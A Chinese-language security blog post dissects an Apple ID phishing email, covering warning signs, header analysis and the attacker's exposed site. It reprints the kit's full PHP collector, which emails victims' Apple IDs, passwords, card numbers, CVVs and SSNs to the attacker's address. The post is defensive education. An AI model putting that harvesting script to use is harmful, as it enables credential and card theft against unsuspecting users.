---
layout: post
title: "Apple ID 釣魚郵件案例"
description: "又收到釣魚郵件了！好的釣魚郵件可以輕易騙取別人的帳號密碼，不好的釣魚郵件甚至可以讓我們破解攻擊者的手法。這次我們來看看一個 Apple ID 的釣魚郵件。"
category: "案例剖析"
tags: [Mail, Phishing]
author: "allenown"
keywords: "Mail, Phishing, 釣魚, 社交工程, Apple"

og_image: ""
---


今天又有不怕死的人寄來釣魚信了，這次是騙取 Apple ID。讓我們來看看這封信，其中內容有非常多破綻，也已經被 Gmail 直接定為 Spam 了，非常可憐。除了信件之外，釣魚的網頁本身也很值得我們借鏡，讓我們來看看這次的釣魚郵件案例。

[![Apple ID 釣魚信](https://lh5.googleusercontent.com/-r8BU7qq8xt0/U7UTt-3wxxI/AAAAAAAAAh0/y00wjTdq4IE/w678-h440-no/2014-07-03-apple-id-phishing-scam-01.png "Apple ID 釣魚信")](https://lh5.googleusercontent.com/-r8BU7qq8xt0/U7UTt-3wxxI/AAAAAAAAAh0/y00wjTdq4IE/s2560/2014-07-03-apple-id-phishing-scam-01.png)

READMORE

### 如何判別釣魚信呢？

先來談談要如何判別釣魚信呢。我們可以從四個要素來看：

1. 標題
2. 寄件者
3. 內文
4. 連結

#### 標題

首先，這封信的標題非常假，一般來說公司不會使用這類標題，這種判斷比較需要經驗。釣魚信件會使用非常聳動、吸引你去做動作的標題。例如常見的「你的帳號遭到停用」、「更換帳號資訊通知」等。點下連結就會帶你去假造的頁面騙你輸入密碼，千萬別傻傻當真。

#### 寄件者

寄件者通常是釣魚信一定會加強假造的部分，利用官方存在的信箱或是他人的信箱寄信，加強你的信任。不過需要特別注意的是：

**寄件者的欄位是可以假造、隨意填寫的，千萬不要直接信任。**

以這封信為例，寄件者「service@apple.com」是不存在的。當然這個欄位可以假造，但連假造都錯，實在是非常不用心。

#### 內文

信件的內文就是精華了，要怎麼做出一封很像官方的信件，又要誘使人去點選，實在是一門藝術。精心設計的釣魚信、社交工程、APT 郵件，通常都會針對受害者客製化，調查身邊的社交圈、常談的話題、常用的服務、會點擊的郵件，來製造一個一定會中獎的信件。

當然很多時候攻擊者調查不足，還是會出現蛛絲馬跡的。例如來自中國的惡意郵件，常會出現「**尊敬的用戶您好**」這種在台灣人眼中看了很彆扭的詞彙。如果出現了不常見的用詞，就非常有可能是一個假造的惡意郵件，千萬不要傻傻的點選連結或附件。

再回頭來以這封信為例，最大的破綻除了非制式的內文之外，就屬署名了。明明是假造「Apple Customer Support」的來信，最下面卻簽署「Microsoft Privacy and cookies Developers」，有沒有搞錯？可以再用點心嗎？

#### 連結

最後的重點就是信件中的釣魚連結了，通常這個連結會帶你前往一個長得跟官方網站一模一樣的登入頁面，騙你輸入帳號密碼登入來竊取。在點選超連結之前，一定要先看一下這個連結前往的位置是不是官方的位置，例如是 Apple 的信件通常就會是前往 Apple.com 自己的網域名稱。當然更要特別注意的是假造的網域名稱，例如使用「App1e.com」來偽裝成「Apple.com」，也是非常常見的。

這封信中使用了最不用心的用法，就是直接拿釣魚網站的 URL 來當連結，一來長得跟官方網域根本不像，二來落落長的連結，到底是想要騙誰點選呢？

### 信件標頭藏有攻擊者的蛛絲馬跡

收到惡意郵件、釣魚郵件，一定要好好看信件的標頭檔（Header）。裡面通常可以看到攻擊者發信的來源，例如是自己架設的發信伺服器或者是使用肉雞來發信。

[![Apple ID 釣魚信 Header](https://lh4.googleusercontent.com/-DSvLz6-NiA4/U7UTt5j6t3I/AAAAAAAAAiE/I0iX66vNa0E/w1044-h582-no/2014-07-03-apple-id-phishing-scam-02.png "Apple ID 釣魚信 Header")](https://lh4.googleusercontent.com/-DSvLz6-NiA4/U7UTt5j6t3I/AAAAAAAAAiE/I0iX66vNa0E/s2560/2014-07-03-apple-id-phishing-scam-02.png)

信件標頭最重要的就是「Received」這個部分，要由下往上閱讀。從這邊我們可以看到信件的流向，從攻擊發起者到發信伺服器，中間經過其他伺服器的轉送，最後到收到釣魚信件的郵件伺服器。因此從最下面的 Received 位置，我們可以知道攻擊者是從「selecttr@cloud.httpdns.co」來寄送信件的，因此 cloud.httpdns.co 很有可能就是攻擊者的伺服器，或者是被駭來發信的伺服器。

如果覺得信件的標頭太長難以閱讀，可以利用 Google 提供的工具「[Google Apps Toolbox - Messageheader](https://toolbox.googleapps.com/apps/messageheader/)」。只要把信件的標頭貼上，他就會自動分析信件的流向，如下圖。

[![檢查信件 header](https://lh4.googleusercontent.com/-5Kz28O5Y_QQ/U7UdDqQzuRI/AAAAAAAAAis/nLqhaKijwIc/w962-h403-no/2014-07-03-apple-id-phishing-scam-08.png "檢查信件 header")](https://lh4.googleusercontent.com/-5Kz28O5Y_QQ/U7UdDqQzuRI/AAAAAAAAAis/nLqhaKijwIc/s2560/2014-07-03-apple-id-phishing-scam-08.png)

### 釣魚網頁，也請你注重安全啊。

接著我們來看一下釣魚頁面。通常「正常」的釣魚頁面都會做得跟官方一模一樣，因為通常攻擊者都會直接把官方網站上面的 HTML 直接下載下來修改。如果有做得不像的，就真的是太不用心的攻擊者。

我們可以看到這個釣魚頁面做得非常像，上面要你輸入帳號、密碼、姓名、生日、信用卡號等資訊，非常惡劣。唯有網址實在是太假，希望沒有人眼拙真的以為這是 Apple 的網站。

[![Apple ID 釣魚網頁](https://lh3.googleusercontent.com/-roay8gwb1xg/U7UTuUnkDxI/AAAAAAAAAic/Za7ARXd50gE/w897-h678-no/2014-07-03-apple-id-phishing-scam-04.png "Apple ID 釣魚網頁")](https://lh3.googleusercontent.com/-roay8gwb1xg/U7UTuUnkDxI/AAAAAAAAAic/Za7ARXd50gE/s2560/2014-07-03-apple-id-phishing-scam-04.png)

秉持的資安研究員的好習慣，我們把網址子目錄去掉，看看網站的根目錄長什麼樣子，結果讓人跌破眼鏡。

[![釣魚網頁開放目錄瀏覽](https://lh6.googleusercontent.com/-9othIZ0WnKQ/U7UTt_UVaSI/AAAAAAAAAh4/Wufvr0iIgHI/w897-h678-no/2014-07-03-apple-id-phishing-scam-03.png "釣魚網頁開放目錄瀏覽")](https://lh6.googleusercontent.com/-9othIZ0WnKQ/U7UTt_UVaSI/AAAAAAAAAh4/Wufvr0iIgHI/s2560/2014-07-03-apple-id-phishing-scam-03.png)

**釣魚網站也請你注重安全啊！**這個網站大剌剌的開著目錄索引，讓我們可以看到網站上的各個目錄、檔案。除了 Apple 的釣魚網頁之外，甚至有釣魚網頁的原始碼「connect-info.zip」，更有著其他釣魚網頁在同個站上。

[![站上其他釣魚頁面](https://lh5.googleusercontent.com/-F1tIkSqFbsM/U7UTu8R0Y1I/AAAAAAAAAiQ/5pxB467FPlM/w897-h678-no/2014-07-03-apple-id-phishing-scam-05.png "站上其他釣魚頁面")](https://lh5.googleusercontent.com/-F1tIkSqFbsM/U7UTu8R0Y1I/AAAAAAAAAiQ/5pxB467FPlM/s2560/2014-07-03-apple-id-phishing-scam-05.png)

既然可以瀏覽，那我們來看看釣魚網頁的原始碼寫得怎樣。抓下來解開之後會看到完整的釣魚網頁，以及接收受騙人資料的主程式「Snd.php」。

[![下載釣魚網頁原始碼](https://lh6.googleusercontent.com/-0v_MrZOZf9A/U7UTvO9EgqI/AAAAAAAAAiM/qqW2mrwy500/w706-h574-no/2014-07-03-apple-id-phishing-scam-06.png "下載釣魚網頁原始碼")](https://lh6.googleusercontent.com/-0v_MrZOZf9A/U7UTvO9EgqI/AAAAAAAAAiM/qqW2mrwy500/s2560/2014-07-03-apple-id-phishing-scam-06.png)

釣魚網頁的程式寫得非常簡單，僅把網頁上接收到的被害人資料、IP，寄送到他的信箱「 justforhacke@gmail.com 」，寄送完畢後會自動導向到官方的頁面偽裝。

[![釣魚網頁原始碼](https://lh4.googleusercontent.com/-1-GdwVT5nkQ/U7UTvu91imI/AAAAAAAAAiY/VCEV9Eo2oMo/w797-h607-no/2014-07-03-apple-id-phishing-scam-07.png "釣魚網頁原始碼")](https://lh4.googleusercontent.com/-1-GdwVT5nkQ/U7UTvu91imI/AAAAAAAAAiY/VCEV9Eo2oMo/s2560/2014-07-03-apple-id-phishing-scam-07.png)

如果釣魚網頁寫得不好，甚至我們有機會可以攻擊他釣魚網頁上的漏洞，直接取得主機的權限，解救世人。從原始碼我們一目了然釣魚網頁的行為、寫法，也可以尋找有無攻擊的機會。

#### 釣魚網頁原始碼備份

{% highlight php %}
<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+| AppLe VbV |+------------\n";
$bilsmg .= "Apple ID                    : ".$_POST['donnee000']."\n";
$bilsmg .= "Password                    : ".$_POST['donnee001']."\n";
$bilsmg .= "Full Name                   : ".$_POST['donnee01']."\n";
$bilsmg .= "Date of Birth               : ".$_POST['donnee02']."/";
$bilsmg .= "".$_POST['donnee3']."/";
$bilsmg .= "".$_POST['donnee4']."\n";
$bilsmg .= "Number Of Credit Card       : ".$_POST['donnee5']."\n";
$bilsmg .= "CVC (CVV)                   : ".$_POST['donnee6']."\n";
$bilsmg .= "Expiration Date             : ".$_POST['donnee7']."/";
$bilsmg .= "".$_POST['donnee8']."\n";
$bilsmg .= "Social Security Number      : ".$_POST['donnee9']."\n";
$bilsmg .= "------------+| APpLe VBV |+------------\n";
$bilsmg .= "Fr0m $ip            \n";


$bilsnd = "justforhacke@gmail.com";
$bilsub = "Apple Result | Fr0m $ip";
$bilhead = "From: Apple Results <justforhacke@gmail.com>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

header('Location:https://itunesconnect.apple.com/WebObjects/iTunesConnect.woa/');

?>
{% endhighlight %}

### 釣魚郵件不死，別再把自己當成肥羊了！

釣魚攻擊最早從 1995 年就開始盛行，一直到快 20 年後的今天，都還是一個非常簡單又有效率的攻擊手法。收到郵件千萬別傻傻的輸入自己的個資、帳號密碼，仔細看一下攻擊者的破綻，別讓他得逞了。

如果有發現疑似釣魚網站，又無法確認，可以到 [PhishTank](http://www.phishtank.com/) 來查查看，找到釣魚網站也可以投稿一下幫助其他人！
